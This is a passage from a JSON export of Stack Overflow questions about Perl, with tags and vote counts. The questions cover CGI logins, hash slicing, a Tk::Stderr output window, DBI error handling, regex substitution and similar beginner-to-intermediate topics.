However, each script is individual, with the exception of the Login screen, which draws a form and then posts to a login.cgi.  The account generation works the same.  But, for the most part, each acts on its own.</p>\n\n<p>My question:\n  How do I link this together so that no action is allowed unless the user is logged in?  I assume that I should use the login script (the one that receives the post action) to drive everything, but how do I do it?  I'm really at a loss here.  I would like to have a user log in, a homepage is drawn with options (add mp3, listen mp3, show staistics, etc.)  Is it best that I draw some sort of form and with actions set to the different scripts?  How do I handle the return from these scripts?  Would cookies help in some way?</p>\n\n<p>Other relevant information:\n  I've done most of my work so far in CGI.pm using the ovid tutorial found on this site and Lincoln Stein's book.</p>\n"},{"tags":["regex","perl"],"answer_count":5,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":3293,"score":7,"question_id":386325,"title":"Where can I find a collection regular expression exercises for Perl?","body":"<p>I learned a lot of Perl RegEx syntax rules, but probably the only way to actually be able to write them is to do a bunch of 'RegEx' related exercises.</p>\n\n<p>I looked over the other \"Learn RegEx\" threads on StackOverflow, but haven't found anything similar.</p>\n\n<p>Is there any collection of such exercises? In form of book, HTML, with/without answers, it doesn't matter, just to keep me writing RegExes for a while.</p>\n"},{"tags":["perl","hash-of-hashes"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":82,"score":-2,"question_id":12476732,"title":"access specific key of a hash of hash in perl?","body":"<pre><code>%HoH = (\nGroup1=&gt; {\n    member1=&gt; \"fred\",\n    member2=&gt; \"barney\",\n},\n Group2 =&gt; {\n    member1   =&gt; \"george\",\n    member2   =&gt; \"jane\",  \n},\n\n);\n</code></pre>\n\n<p>How can I access second value or second key of <strong>HoH</strong>  I want to access <strong>member2</strong> of each group  keys and their associated values.I don't know my key name , I just know it is second key</p>\n\n<pre><code>   foreach $key (keys %HoH){\n        foreach $value (keys %{$HoH{$key}}){\n            print $key.\"\\n\";\n         }\n   }\n</code></pre>\n"},{"tags":["perl","gui","tk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12466349,"title":"Tk::Stderr empty text subwidget","body":"<p>I've written a perl/tk gui. The stderr &amp; stdout write to a popup window, but I cannot clear the text when the popup window is destroyed (it is actually withdrawn). I could not install Tk::Stderr so I appended the module to the end of my script. Below is a working example.</p>\n\n<p>I have added the following line to the Print subroutine, but it is overkill:</p>\n\n<pre><code>$text-&gt;delete('0.0', 'end');\n</code></pre>\n\n<p>My suspicion is that something could be added to the following line in the Populate subroutine:</p>\n\n<pre><code>$mw-&gt;protocol(WM_DELETE_WINDOW =&gt; [ $mw =&gt; 'withdraw']);\n</code></pre>\n\n<p>but I don't know what. I would appreciate any assistance.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse strict;\nuse Tk;\n# use Tk::Stderr; &lt;&lt; ** pasted module after main ** - honyok\n\n# create main window\nmy $mw = MainWindow-&gt;new;\n$mw-&gt;InitStderr;\n$mw-&gt;optionAdd(\"*font\", \"-*-calibri-normal-r-*-*-*-120-*-*-*-*-*-*\");\n$mw-&gt;protocol('WM_DELETE_WINDOW'=&gt; sub{exit});\n$mw-&gt;geometry( \"100x100\");\n$mw-&gt;resizable(0,0);# not resizable\n# create buttons\nmy $button1=$mw-&gt;Button(-text=&gt;'STDERR',-command=&gt;[sub{print STDERR \"Writing to STDERR\\n\";}])-&gt;pack;\nmy $button2=$mw-&gt;Button(-text=&gt;'STDOUT',-command=&gt;[sub{print STDOUT \"Writing to STDOUT\\n\";}])-&gt;pack;\n\nMainLoop;\n# =========================== end main ==================================\n\n\n##==============================================================================\n## Tk::Stderr - capture program standard error output\n##==============================================================================\n## $Id: Stderr.pm,v 1.2 2003/04/01 03:58:42 kevin Exp $\n##==============================================================================\n#require 5.006;\npackage Tk::Stderr;\nuse strict;\nuse warnings;\nuse vars qw($VERSION @ISA);\n($VERSION) = q$Revision: 1.2 $ =~ /Revision:\\s+(\\S+)/ or $VERSION = \"0.0\";\nuse base qw(Tk::Derived Tk::MainWindow);\n\nuse Tk::ROText;\nuse Tk::Frame;\n\n##==============================================================================\n## Populate\n##==============================================================================\nsub Populate {\n    my ($mw, $args) = @_;\n    my $private = $mw-&gt;privateData;\n    $private-&gt;{ReferenceCount} = 0;\n    $private-&gt;{Enabled} = 0;\n\n    $mw-&gt;SUPER::Populate($args);\n\n    $mw-&gt;withdraw;\n    $mw-&gt;protocol(WM_DELETE_WINDOW =&gt; [ $mw =&gt; 'withdraw']);\n    my $f = $mw-&gt;Frame(\n        Name =&gt; 'stderr_frame',\n    )-&gt;pack(-fill =&gt; 'both', -expand =&gt; 1);\n\n    my $text = $f-&gt;Scrolled(\n        'ROText',\n        Name =&gt; 'stderr_text',\n        -scrollbars =&gt; 'se',\n        -label=&gt;'Output/Errors',\n        -wrap =&gt; 'none'\n        #-background=&gt;'slate grey'\n    )-&gt;pack(-fill =&gt; 'both', -expand =&gt; 1);\n\n    $mw-&gt;Advertise('text' =&gt; $text);\n    $mw-&gt;ConfigSpecs(\n        '-title' =&gt; [ qw/METHOD title Title/, \"truGrid\" ],\n    );\n\n    $mw-&gt;Redirect(1);\n    return $mw;\n}\n\n##==============================================================================\n## Redirect\n##==============================================================================\nsub Redirect {\n\n    my ($mw, $boolean) = @_;\n    my $private = $mw-&gt;privateData;\n    my $old = $private-&gt;{Enabled};\n\n    if ($old &amp;&amp; !$boolean) {\n        untie *STDOUT;# ** hacked this line ** - honyok\n        untie *STDERR;\n        $SIG{__WARN__} = 'DEFAULT';\n    } elsif (!$old &amp;&amp; $boolean) {\n        tie *STDOUT, 'Tk::Stderr::Handle', $mw;# ** hacked this line ** - honyok\n        tie *STDERR, 'Tk::Stderr::Handle', $mw;\n        $SIG{__WARN__} = sub { print STDOUT @_ };# ** hacked this line ** - honyok\n        $SIG{__WARN__} = sub { print STDERR @_ };\n    }\n    $private-&gt;{Enabled} = $boolean;\n    return $old;\n}\n\n\n##==============================================================================\n## DecrementReferenceCount\n##==============================================================================\nsub DecrementReferenceCount {\n    my ($mw) = @_;\n    my $private = $mw-&gt;privateData;\n\n    if (--$private-&gt;{ReferenceCount} &lt;= 0) {\n        $mw-&gt;destroy;\n    }\n}\n\n##==============================================================================\n## IncrementReferenceCount\n##==============================================================================\nsub IncrementReferenceCount {\n    my ($mw) = @_;\n    my $private = $mw-&gt;privateData;\n\n    ++$private-&gt;{ReferenceCount};\n}\n\n\npackage MainWindow;\nuse strict;\nuse warnings;\n\nmy $error_window;\n\n##==============================================================================\n## InitStderr\n##==============================================================================\nsub InitStderr {\n    my ($mw, $title) = @_;\n\n    unless (defined $error_window) {\n        $error_window = Tk::Stderr-&gt;new;\n        $error_window-&gt;title($title) if defined $title;\n    }\n    $error_window-&gt;IncrementReferenceCount;\n    $mw-&gt;OnDestroy([ 'DecrementReferenceCount' =&gt; $error_window ]);\n    return $mw;\n}\n\n##==============================================================================\n## StderrWindow\n##==============================================================================\nsub StderrWindow {\n    return $error_window;\n}\n\n##==============================================================================\n## RedirectStderr\n##==============================================================================\nsub RedirectStderr {\n    my ($mw, $boolean) = @_;\n\n    unless (defined $error_window) {\n        $mw-&gt;InitStderr if $boolean;\n        return;\n    }\n    return $error_window-&gt;Redirect($boolean);\n}\n\n\n##==============================================================================\n## Define the handle that actually implements things.\n##==============================================================================\nBEGIN {\n    package Tk::Stderr::Handle;\n    use strict;\n    use warnings;\n\n    ##==========================================================================\n    ## TIEHANDLE\n    ##==========================================================================\n    sub TIEHANDLE {\n        my ($class, $window) = @_;\n        bless \\$window, $class;\n    }\n\n    ##==========================================================================\n    ## PRINT\n    ##==========================================================================\n    sub PRINT {\n        my $window = shift;\n        my $text = $$window-&gt;Subwidget('text');\n        $text-&gt;insert('end', $_) foreach (@_);\n        $text-&gt;see('end');\n        $$window-&gt;deiconify;\n        $$window-&gt;raise;\n        $$window-&gt;focus;\n        $$window-&gt;update;# ** hacked this line ** - honyok\n    }\n\n    ##==========================================================================\n    ## PRINTF\n    ##==========================================================================\n    sub PRINTF {\n        my ($window, $format) = splice @_, 0, 2;\n\n        $window-&gt;PRINT(sprintf $format, @_);\n    }\n}\n1;\n##==============================================================================\n## $Log: Stderr.pm,v $\n## Revision 1.2  2003/04/01 03:58:42  kevin\n## Add RedirectStderr method to allow redirection to be switched on and off.\n##\n## Revision 1.1  2003/03/26 21:48:43  kevin\n## Fix dependencies in Makefile.PL\n##\n## Revision 1.0  2003/03/26 19:11:32  kevin\n## Initial revision\n##==============================================================================\n</code></pre>\n"},{"tags":["perl","error-handling","die"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":4389,"score":3,"question_id":2628475,"title":"Perl: catch error without die","body":"<p>I'm playing around with error handling and got a little problem.\nI connect with a database using the DBI module.</p>\n\n<p>I do my own error handling by using a subroutine that I call upon an error.</p>\n\n<p>I can catch my own dies and handle them just fine but when my database connection fails, the DBI module apparently prints out it's own die :</p>\n\n<blockquote>\n  <p>DBI connect(...) failed: ORA-12154: TNS:could not resolve the \n      connect identifier specified (DBD ERROR: OCIServerAttach) at ...</p>\n</blockquote>\n\n<p>How would I go about catching this ?</p>\n\n<p>I tried using <code>$SIG{__DIE__}</code> like so :</p>\n\n<pre><code>local $SIG{__DIE__} = sub {\n  my $e = shift;\n  print \"Error: \" .$e;\n};\n</code></pre>\n\n<p>This is on the bottom of my main file, in this file I also call the connect subroutine that is available in a module of my own. I also tried putting this piece of code on the bottom of my module but it still prints the error without the </p>\n\n<blockquote>\n  <p>Error:</p>\n</blockquote>\n\n<p>in front of it.</p>\n"},{"tags":["html","xml","perl","xslt"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12475091,"title":"Perl convert XML to HTML using XSLT","body":"<p>Im a noob at perl, I was wondering if any one could help me with a task I need doing.</p>\n\n<p>I have a XML file and a XSLT file, i need to use perl to some how create a html file using these two files. does any one have any ideas on where i can start, or what perl modules I can look at to help me with this ?</p>\n"},{"tags":["perl","shift","circular"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":4,"view_count":84,"score":-3,"question_id":12466965,"title":"Perl how to circular shift some bits","body":"<p>what is a good approach to circular shifting some in perl?</p>\n\n<p>exp1.txt</p>\n\n<pre><code>1010\n1110\nhello\n</code></pre>\n\n<p>Result:</p>\n\n<pre><code>0101\n0111\nolleh\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["perl","api","imagemagick"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":92,"score":0,"question_id":12472036,"title":"How can I convert RGB to Lab?","body":"<p>I have RGB values of downscaled pictures in my database and would like to use imagemagick to take care of the conversion to <a href=\"http://en.wikipedia.org/wiki/Lab_color_space\" rel=\"nofollow\">Lab</a>. But I have not been able to find code samples for this.</p>\n\n<p>How can i convert RGB color values to Lab using the Perl Imagemagick API? Is this even possible?</p>\n"},{"tags":["mysql","perl","execute"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":40,"score":-1,"question_id":12473426,"title":"Can I check to see if an execution works without it dying in Perl mysql?","body":"<p>I am connecting to a database and I am taking an input from STDIN that I use as part of an execution. \nSo I have:</p>\n\n<pre><code>my $i = 0;\n\nwhile($i != 1) {\n    print \"Input: \";\n    my $input = &lt;STDIN&gt;;\n    chomp $input;\n    my $test = $dbh-&gt;prepare(\"show tables like $input\");\n</code></pre>\n\n<p>and then I want to check that the input is a valid entry in the database and loop round again if it isn't:</p>\n\n<pre><code>    if ($test-&gt;execute()) {\n        print \"Input exists in database\\n\";\n        $i = 1;\n    }\n    else {\n        print \"Input does not exist.\\n\";\n    }\n} # end of while\n</code></pre>\n\n<p>I know that this does not work, but I would like something similar that isn't <code>execute or die</code> as I do not want to exit my program. Is this possible? </p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12471770,"title":"Replace keys with values in a file using Perl","body":"<p>I have to replace all the keys in a hash with its respective hash values. This operation is performed in a file.</p>\n\n<p>Below is my code:</p>\n\n<pre><code>my $file= 'IFandENDIF.txt';\nmy $bak= \"$file.bak\";\nrename $file, $bak or die \"cannot rename $file into $bak: $!\";\n\nopen( my $in,  '&lt;', $bak)  or die \"cannot open $bak: $!\";\nopen( my $out, '&gt;', $file) or die \"cannot create $file: $!\";\n\nwhile( &lt;$in&gt;)\n{ \n    s/if(exists(%replstr))/$replstr{$1}/xeg;    \n    print {$out} $_;   \n}\n\nclose $in; \nclose $out;\n</code></pre>\n\n<p>Please guide me on this.</p>\n"},{"tags":["java","regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12470881,"title":"Transitioning Perl regexes to POSIX regexes","body":"<p>I have tried the <a href=\"http://www.dmst.aueb.gr/dds/pubs/jrnl/2007-SPANDE-FIRE/html/KS07.html\" rel=\"nofollow\">Fire/J Regular expression</a> library and results have been awesome. Fire/J uses POSIX compliant regular expressions but our current library uses Perl5Matcher which is not POSIX compliant. We have hundreds of regexes to transition, so are there any tools to translate Perl compatible regular expressions to POSIX compliant?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":73,"score":1,"question_id":12470676,"title":"Is anything wrong in following code?","body":"<p>I am trying to insert multiple values to the same field using a single query. Are there any mistakes in the following code?</p>\n\n<pre><code>my $dbh =  DBI-&gt;connect(\"DBI:mysql:accounting:localhost\", 'username', 'password',\n      {RaiseError =&gt; 1});\nmy @id = [1,18,976,90];\nmy @name = ['ss','dc','ws','rd'];\nmy @data = ([@id],[@name]);\nmy $ab = $dbh-&gt;prepare(\"insert into table (id,name) values (?,?)\";);\nfor my $datam (@data) {\n  $ab-&gt;execute(@$datam);\n}\n$ab-&gt;finish();\n</code></pre>\n\n<p>I am getting the following error: <code>DBI::st=HASH(0*a16f774)</code> for prepare statement. What could be causing this?</p>\n"},{"tags":["perl","loops","hash","each","endless"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":12470137,"title":"Perl hash: while-each-loop runs into endless loop","body":"<p>The following Perl code runs into an endless loop. \nIt looks like <code>each</code> resets itself after the subroutine call.\nWhy is that so?</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nmy %h = ( \"a\" =&gt; \"b\" );\nwhile ( my ($x, $y) = each %h ) {\n    &amp;do_something( \\%h );\n}\n\nsub do_something(){\n    my %tmp  = %{$_[0]};\n}\n</code></pre>\n\n<p>Interestingly, this works:</p>\n\n<pre><code>while ( my ($x, $y) = each %h ) {\n    &amp;do_something( \\%h );\n}\n\nsub do_something(){\n}\n</code></pre>\n\n<p>While this does not:</p>\n\n<pre><code>while ( my ($x, $y) = each %h ) {\n    &amp;do_something( %h );\n}\n\nsub do_something(){\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":787,"score":2,"question_id":8421100,"title":"How to delete lines matching a certain pattern in Perl?","body":"<p>I'd like to do something similar to <code>sed</code> in Perl, namely be able to delete lines matching a certain pattern. </p>\n\n<p>Given this input:</p>\n\n<pre><code>abcd\nedfd\nabcd\nderder\nabcd\nerre\n</code></pre>\n\n<p>I want to remove the lines containing <code>bc</code>. How can I do this?</p>\n"},{"tags":["perl","init.d","psgi"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":12454938,"title":"Init scripts for Twiggy-based PSGI apps","body":"<p>I'm looking for a way to manage several Twiggy instances listening on different ports via a simple config file and a standard interface. </p>\n\n<p>E.g. I want a config that looks like</p>\n\n<pre><code>dog 5000 /www/psgi/dog.pl\ncow 5001 /www/psgi/holycow.pl\n# ...\n</code></pre>\n\n<p>And a script in /etc/init.d that is used like</p>\n\n<pre><code>sudo service twiggy start\n# start all services\nsudo service twiggy restart dog\n# cow remains intact\n# ...\n</code></pre>\n\n<p>Some of my co-workers suggest <a href=\"http://smarden.org/runit/\" rel=\"nofollow\">runit</a>, and it looks promising, however I'm not familiar enough with it yet.</p>\n\n<p>Before starting to write my own script(s), I dare to ask SO: does one exist already?</p>\n"},{"tags":["perl","install","containers","upgrade","independent"],"answer_count":2,"favorite_count":4,"up_vote_count":7,"down_vote_count":0,"view_count":143,"score":7,"question_id":6517562,"title":"How to run multiple Perl installs on one machine?","body":"<p>Is it possible to run multiple installs of Perl (in \"containers\") on one machine?</p>\n\n<p>Reason is that I have different Perl-based server side web applications and wish to schedule updates to them independently.</p>\n\n<p>For example, bugzilla upgrades seem to me to be very invasive, downloading all manner or module updates and lengthy, too (thereby increasing the chance of unpredictable behavior on other applications that depend on those modules, during the time that the upgrade is still partial).</p>\n\n<p>I think it should be possible to run multiple independent server-side CGI Perl applications on one server, I'd rather not be told to separate them onto different machines - I think that's wasteful and I don't have that resource anyway.</p>\n"},{"tags":["perl","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":2,"view_count":72,"score":1,"question_id":12466727,"title":"download url content of the cgi web page","body":"<p>I have cgi search engine for local flat database search and I would like to add option the user able to export/download the search result. is that possible with cgi?\nthis is the code.</p>\n\n<pre><code>     #!/usr/bin/perl\n      read(STDIN, $buffer,$ENV{'CONTENT_LENGTH'});\n      # Split the name-value pairs\n      @pairs = split(/&amp;/, $buffer);\n      foreach $pair (@pairs) {\n       ($key, $value) = split(/=/, $pair);\n\n     $value =~ tr/+/ /;\n      $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack(\"C\", hex($1))/eg;\n\n     $formdata{$key}.= \"$value\";\n      }\n   $search = $formdata{'search'};\n   open(INFO, \"/test.txt\");   \n   @array=&lt;INFO&gt;;\n   close (INFO);\n   print \"Content-type:text/html\\n\\n\";\n   print \"&lt;html&gt;\\n\";\n    print \"&lt;head&gt;&lt;title&gt;Search result&lt;/title&gt;&lt;/head&gt;\\n\";\n   print \"&lt;body&gt;\\n\"; \n   print \"&lt;h4&gt;&lt;font color=#990000&gt;This is your search result!&lt;/h4&gt;\\n\"; \n   $search_url = 'https://test.php';\n   foreach $line (@array) {\n   if ($line =~ /$search/){\n   ($host,$ip)=split(/\\|/,$line);\n   $records= ++$counter;\n   @result =($host,$ip);\n   print \"&lt;font color=#7a378b&gt;&lt;b&gt;&lt;p&gt;\";\n   print \"&lt;table border=0 cellpadding=0 cellspacing=0 style=border-collapse: collapse       \n   bordercolor=#111111 width=20% bgcolor=#C0C0C0&gt;\";\n\n   print \"&lt;/tr&gt;\";\n   foreach (@result) {\n   @words = split ;\n   print     \"&lt;tr&gt;&lt;td width=33% bgcolor=#DCDCDC&gt;&lt;b&gt;&lt;font color=#000080 size=1   face=Courier New&gt;$words[0]&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;\";\n  print     \"&lt;td width=36% bgcolor=#DCDCDC&gt;&lt;b&gt;&lt;font color=#000080 size=1 face=Courier    \n  New&gt;$words[1]&lt;/font&gt;&lt;/b&gt;&lt;/td&gt;\";\n  print \"&lt;/table&gt;\";\n }\n }\n   }\n\n  if ($records== 0) {\n  print \" Sorry! No records found\\n\";\n   }\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12463578,"title":"Creating a file name using variables in Perl","body":"<p>I am trying to write out to a file, where the file name is created from a variable(the name + the user id + the date and time + file extension).</p>\n\n<p>I have read various things on Stackoverflow which I have based my code off.</p>\n\n<pre><code>my $windowsfile = \"winUserfile-$User_ID-$datetime.csv\";\nopen winUserfile, \"&gt;&gt;\", $windowsfile) or die \"$!\";\nprint winUserfile \"User_ID, Expression\\n\";\nclose winUserfile;\n</code></pre>\n\n<p>I would assumed this would work, but I am getting a syntax error. Would anyone be able to help?</p>\n"},{"tags":["perl","unit-testing","asynchronous","anyevent"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":1,"view_count":114,"score":3,"question_id":10130717,"title":"is there a way to view the AnyEvent event queue","body":"<p>I'm working on a perl project written asynchronously using AnyEvent... during testing, I had a situation where a bug in my code caused blocked code to be called after my test had completed... so the test looked like it passed, but the blocked call ended up polluting other tests later on.  What I'd like to have happen is in the teardown for the test, verify that AnyEvent isn't waiting on any other blocked calls.  Is this possible to check AnyEvent if it has any calls that haven't yet been executed?</p>\n"},{"tags":["java","perl","mechanize"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":2503,"score":6,"question_id":2867499,"title":"mechanize for Java","body":"<p>I was wondering if there is something like Perl's/Python's mechanize for Java.</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl","debugging","hashmap"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12467116,"title":"Add to Perl hash yields puzzling results","body":"<p>I am somewhat new to Perl, and this bug has puzzled me for a couple of days. I've had difficulty finding anything on Google for a problem this specific. I will try to present the \"clues\" as clearly as possible. I am using Perl v5.16.1. The relevant lines in my code are these:</p>\n\n<pre><code>my %result = ();\n\n...\n\n$result{'TABLENAME'} = $tableName;\n\n...\n\nfor my $i (1..$numberOfColumns) {\n    $result{$columnNames[$i-1]} = $columnValues[$i-1];\n}\n</code></pre>\n\n<p>In my test, <code>$numberOfColumns</code> is 7. The problem is that the for-loop does not create the key-value pairs as I expect. I will explain. I've tried debugging using Perl's debugger with <code>perl -d</code>. The debugger output below shows things going fine until the last line.</p>\n\n<pre><code>  DB&lt;2&gt; c 219\ntestcode::testsub(modules/testcode.pm:219):\n219:        $result{'TABLENAME'} = $tableName;\n\n  DB&lt;3&gt; c 239\ntestcode::testsub(modules/testcode.pm:239):\n239:        for my $i (1..$numberOfColumns) {\n\n  DB&lt;4&gt; p %result\nTABLENAMEmyowntableitis\n\n  DB&lt;5&gt; p $result{TABLENAME}\nmyowntableitis\n\n  DB&lt;6&gt; s\ntestcode::testsub(modules/testcode.pm:240):\n240:            $result{$columnNames[$i-1]} = $columnValues[$i-1];\n\n  DB&lt;6&gt; p $i\n1\n\n  DB&lt;7&gt; p $columnNames[0]\nid\n\n  DB&lt;8&gt; p $columnValues[0]\n1\n\n  DB&lt;9&gt; s\ntestcode::testsub(modules/testcode.pm:240):\n240:            $result{$columnNames[$i-1]} = $columnValues[$i-1];\n\n  DB&lt;9&gt; p $i\n2\n\n  DB&lt;10&gt; p %result\nTABLENAMEmyowntableitisid\n1\n\n  DB&lt;11&gt; p $result{TABLENAME}\n    myowntableitis\n\n  DB&lt;12&gt; p $result{id}\n\n  DB&lt;13&gt;\n</code></pre>\n\n<p>I expected the last <code>p $result{id}</code> to return 1 instead of nothing. Does anyone have an idea what could be happening here?</p>\n"},{"tags":["perl","hash","slicing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":39,"score":-1,"question_id":12466566,"title":"Slicing a hash using keys stored in a hash of arrays in Perl","body":"<p>Inspired by the answer to this other question: <a href=\"http://stackoverflow.com/questions/12464006/slicing-a-nested-hash-in-perl\">Slicing a nested hash in Perl</a>, what is the syntax for slicing a hash using a list of keys held in another hash?</p>\n\n<p>I thought the following would do it, but it doesn't:</p>\n\n<pre><code>@slice_result = @{$hash1{@($hash_2{$bin})}};\n</code></pre>\n\n<p>I get an error that says <code>\"scalar found where operator expected\"</code>. ?</p>\n"},{"tags":["perl","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12466850,"title":"Reading a TSV record into a Perl hash","body":"<p>I have an array <strong>@fields</strong> containing names for the tab-separated values in <strong>$record</strong> (it may have been populated from record 0 of the file, for instance).  </p>\n\n<p>The order of the array entries corresponds to the order of the values in the record.  </p>\n\n<p>I want to populate <strong>%hash</strong> with <strong>field => value</strong> entries for each value in the record.</p>\n\n<p>Is there a one-liner to do this?  I can't figure out how to coordinate traversing the <strong>@fields</strong> and <strong>split(\"\\t\", $record)</strong> list concurrently.  </p>\n\n<p>Best I can come up with is</p>\n\n<pre><code>my %hash;\nmy @values = split(\"\\t\", $record);\nfor my $field (@fields) {\n    my $value = shift @values;\n    $hash{$field} = $value;\n}\n</code></pre>\n\n<p>But I suspect there's a simpler way to do it.</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","hash","slice"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":104,"score":3,"question_id":12464006,"title":"Slicing a nested hash in Perl","body":"<p>Say I have a hash that I can index as:</p>\n\n<pre><code>$hash{$document}{$word}\n</code></pre>\n\n<p>From what I read online (although I could not find this on <a href=\"http://perldoc.perl.org/perlreftut.html\" rel=\"nofollow\">perlreftut</a>, <a href=\"http://perldoc.perl.org/perldsc.html#Access-and-Printing-of-a-HASH-OF-ARRAYS\" rel=\"nofollow\">perldsc</a> or <a href=\"http://perldoc.perl.org/perllol.html#Slices\" rel=\"nofollow\">perllol</a>), I can slice a hash using a list if I use the <code>@</code> prefix on my hash to indicate that I want the hash to return a list. However, if I try to slice my hash using a list <code>@list</code>:</p>\n\n<pre><code>@%hash{$document}{@list}\n</code></pre>\n\n<p>I get several <code>\"Scalar values ... better written\"</code>  errors.</p>\n\n<p>How can I slash a nested hash in Perl?</p>\n"},{"tags":["perl","excel","patterns","ole"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12206625,"title":"How to use msoPattern constants to apply a pattern to a series in an Excel chart using Perl Win32::OLE","body":"<p>I am using the Win32::OLE Perl module to change the pattern for a particular data point in a chart.</p>\n\n<p>I can do this using:</p>\n\n<pre><code>$chart-&gt;SeriesCollection(2)-&gt;Points(5)-&gt;{Interior}-&gt;{Pattern} = xlPatternUp;\n</code></pre>\n\n<p>for example. To be clear this works exactly as expected.\nHowever the xlPattern* constants only allow for a subset of the patterns Excel recognizes. It appears the full set of patterns is specified in the msoPattern* constants (at least the particular one I want to use is).</p>\n\n<p>I tried to use one of the msoPattern* constants in the same manner:</p>\n\n<pre><code>$chart-&gt;SeriesCollection(2)-&gt;Points(5)-&gt;{Interior}-&gt;{Pattern} =\nmsoPatternWideUpwardDiagonal;\n</code></pre>\n\n<p>But this has no effect. The data point will render with a \"solid\" (default) pattern.\nI have confirmed that I am importing the constants correctly, e.g.:</p>\n\n<pre><code>use Win32::OLE::Const 'Microsoft Office 12.0 Object Library';\n</code></pre>\n\n<p>How can I use the msoPattern* constants to change the pattern?</p>\n"},{"tags":["perl","sorting","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12465197,"title":"Sorting a hash of arrays looking up the comparisons in another hash in Perl","body":"<p>Say I want sort a hash of arrays (<code>%hash</code>) by looking up the comparisons in another hash (<code>%comparator</code>):</p>\n\n<p>I thought the following would work, but it didn't.</p>\n\n<pre><code>for ($bin_ix=1; $bin_ix&lt;scalar(keys(%cluster_bins)); $bin_ix++) {    \n   $hash{$bin_ix} = sort {$comparator{$a} &lt;=&gt; $comparator{$b} $hash{$bin_ix}};\n} \n</code></pre>\n\n<p>It complains with: <code>Missing operator before %hash</code>. What am I missing?</p>\n"},{"tags":["perl","perl-data-structures"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":70,"score":0,"question_id":12464984,"title":"Why does function call as argument to the push cause 'Not an ARRAY reference' in Perl?","body":"<p>Would somebody be so pleasant to explain why does the next thing happen? Here is the code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse v5.14;\nuse warnings;\n\nmy @arr = (1, 2, 3);\n\nsub func\n{\n    return @arr;\n}\n\npush(&amp;func(), 4);\n\nsay @arr;\n</code></pre>\n\n<p>When I try to run it, the output is <code>Not an ARRAY reference at ...</code>. </p>\n\n<p>I suppose that this is because <code>&amp;func()</code> evaluates not to the <code>@arr</code>, but to a plain list <code>1, 2, 3</code> and <code>1</code> is treated as <code>ARRAY</code> argument to the <code>push</code>. Can somebody explain why does this happen, cause in the <code>push</code> documentation I found nothing related to this.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["perl","exception-handling","try-catch","cpan","weak-typing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":129,"score":1,"question_id":12462109,"title":"Try::Tiny: Weird behaviour with try-catch or Not?","body":"<p>I am using <code>Try::Tiny</code> for try-catch.</p>\n\n<p>Code goes as below:</p>\n\n<pre><code>use Try::Tiny;\n\ntry {\n    print \"In try\";\n    wrongsubroutine();  # undefined subroutine\n}\ncatch {\n    print \"In catch\";\n}\n\nsomefunction();\n</code></pre>\n\n<p>...</p>\n\n<pre><code>sub somefunction {\n    print \"somefunction\";\n}\n</code></pre>\n\n<p>When I execute\nIt comes like this:</p>\n\n<pre><code>somefunction\nIn Try\nIn catch\n</code></pre>\n\n<p>The output sequence looks wrong to me. Is it wrong? or Is this normal behavior?</p>\n"},{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12458313,"title":"Perl and regex: how to empty a line of text containing several spaces ? (number of spaces can vary)","body":"<p>Using Perl, I need to empty a string which <strong>contains several spaces</strong></p>\n\n<p>I can't come out with the correct regex</p>\n\n<p><strong>Here is my text:</strong></p>\n\n<pre><code>&lt;sentence=\"I am walking on the street and it is raining\" &gt;\n&lt;/sentence&gt;\n</code></pre>\n\n<p>I want to empty this string to get:</p>\n\n<pre><code>&lt;sentence=\"\" &gt;\n&lt;/sentence&gt;\n</code></pre>\n\n<p><strong>Here is my code (it is just replacing a string without 